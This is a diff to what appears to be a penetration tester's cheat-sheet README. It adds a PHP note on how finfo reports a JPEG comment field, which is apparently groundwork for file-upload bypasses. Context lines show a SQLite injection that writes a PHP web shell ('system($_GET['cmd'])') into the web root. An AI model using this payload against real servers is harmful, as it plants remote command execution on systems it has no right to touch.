@@ -12,6 +12,7 @@
    + [Request Smuggling](#request-smuggling)
    + [Hackvertor](#hackvertor)
    + [SQL Injection](#sql-injection)
+   + [PHP](#php)
 - [Network](#network)
 - [/dev/null](#devnull)
 
@@ -146,6 +147,19 @@ ATTACH DATABASE '/var/www/html/y.php' AS y;--
 CREATE TABLE y.p (dataz text);--
 INSERT INTO y.p (dataz) VALUES ('<? system($_GET[''cmd'']);?>');--
 ```  
+### PHP
+### finfo with specific comment
+```php
+// After Upload:
+echo (new finfo)->file($_FILES["fileToUpload"]["tmp_name"]);
+//Rendered:
+JPEG image data, JFIF standard 1.02, aspect ratio, density 1x1, segment length 16, comment: "AAAAAAAAAAAAAAAAAA"
+/*
+Uploaded file:
+$ cat test1234.txt | base64
+/9j/4AAQSkZJRgABAgAAAQABAAD//kFBQUFBQUFBQUFBQUFBQUFBQUFB
+*/
+```
 ## Network  
 ### Lookup and display the route for a destination  
 ```
